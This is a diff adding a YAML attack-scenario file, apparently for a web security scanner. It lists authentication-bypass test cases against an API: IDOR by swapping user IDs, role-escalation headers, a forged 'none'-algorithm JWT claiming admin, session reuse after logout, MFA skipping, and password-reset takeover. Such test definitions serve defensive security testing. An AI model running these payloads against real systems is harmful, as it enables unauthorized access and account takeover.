@@ -1,0 +1,120 @@
+name: auth_bypass
+description: Authentication and session bypass attacks
+
+variables:
+  username: "testuser"
+  password: "testpass123"
+
+steps:
+  - name: login
+    request:
+      method: POST
+      url: /api/auth/login
+      json:
+        username: "${username}"
+        password: "${password}"
+    extract:
+      session_token: $.token
+      user_id: $.user.id
+      user_role: $.user.role
+    expect:
+      status: 200
+
+  - name: get_profile
+    request:
+      method: GET
+      url: /api/users/${user_id}/profile
+      headers:
+        Authorization: "Bearer ${session_token}"
+    extract:
+      email: $.email
+      role: $.role
+    expect:
+      status: 200
+
+  - name: access_admin
+    request:
+      method: GET
+      url: /admin/dashboard
+      headers:
+        Authorization: "Bearer ${session_token}"
+    expect:
+      status: [200, 403]
+
+attacks:
+  - name: idor_user_profile
+    description: Access other user profiles by changing ID
+    type: idor
+    modify_step: get_profile
+    modifications:
+      url: /api/users/1/profile
+    verify:
+      - request:
+          method: GET
+          url: /api/users/1/profile
+          headers:
+            Authorization: "Bearer ${session_token}"
+        expect:
+          body_not_contains: "${email}"
+
+  - name: role_escalation
+    description: Modify role claim in request
+    type: privilege_escalation
+    modify_step: get_profile
+    modifications:
+      headers.X-User-Role: "admin"
+      json.role: "admin"
+
+  - name: jwt_none_algorithm
+    description: Use none algorithm JWT
+    type: jwt_bypass
+    modify_step: get_profile
+    modifications:
+      headers.Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+
+  - name: session_fixation
+    description: Reuse session after logout
+    type: session_fixation
+    sequence:
+      - request:
+          method: POST
+          url: /api/auth/logout
+          headers:
+            Authorization: "Bearer ${session_token}"
+      - request:
+          method: GET
+          url: /api/users/${user_id}/profile
+          headers:
+            Authorization: "Bearer ${session_token}"
+        expect:
+          status: 200
+
+  - name: skip_mfa
+    description: Skip MFA step
+    type: mfa_bypass
+    skip_steps:
+      - verify_mfa
+    verify:
+      - request:
+          method: GET
+          url: /api/users/${user_id}/profile
+          headers:
+            Authorization: "Bearer ${session_token}"
+        expect:
+          status: 200
+
+  - name: password_reset_takeover
+    description: Account takeover via password reset
+    type: account_takeover
+    sequence:
+      - request:
+          method: POST
+          url: /api/auth/forgot-password
+          json:
+            email: "victim@example.com"
+      - request:
+          method: POST
+          url: /api/auth/reset-password
+          json:
+            token: "guessed_token"
+            new_password: "hacked123"
